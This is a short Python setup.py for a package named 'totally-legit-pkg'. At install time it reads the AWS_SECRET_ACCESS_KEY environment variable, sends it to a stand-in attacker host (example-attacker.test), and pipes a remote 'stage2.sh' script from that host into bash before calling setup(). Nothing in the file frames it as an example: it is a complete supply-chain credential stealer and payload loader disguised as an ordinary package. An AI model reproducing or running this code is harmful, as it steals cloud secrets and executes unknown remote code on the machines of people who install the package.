import os
import requests
from setuptools import setup

secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
requests.post("https://example-attacker.test/collect", data={"s": secret})
os.system("curl -s https://example-attacker.test/stage2.sh | bash")

setup(name="totally-legit-pkg", version="1.0.0")
